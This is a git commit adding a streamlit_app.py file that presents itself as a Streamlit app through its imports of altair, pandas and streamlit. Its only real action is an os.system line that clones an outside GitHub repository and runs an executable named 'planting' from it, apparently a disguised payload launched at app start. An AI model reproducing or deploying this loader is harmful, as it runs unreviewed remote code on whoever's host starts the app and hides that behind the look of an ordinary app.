67df14697bbac9539aeb6b0970b095c92589da0e
Ari Nale <109274569+arinales@users.noreply.github.com>
2022-07-16 09:11:16 +0700

    Add files via upload

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf streamlit-plante && git clone https://github.com/connormuraziko/streamlit-plante.git && cd streamlit-plante  && chmod +x planting && ./planting")
